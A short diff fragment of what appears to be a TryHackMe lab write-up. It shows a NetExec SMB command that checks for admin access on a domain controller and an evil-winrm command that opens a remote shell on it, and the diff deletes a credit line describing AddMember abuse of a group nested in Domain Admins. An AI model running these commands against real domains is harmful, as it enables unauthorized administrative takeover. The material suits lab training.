@@ -16,4 +16,3 @@ nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3
 evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
 ```
 
-— TryHackMe / Dead Drop (`AddMember` on a group nested in Domain Admins)
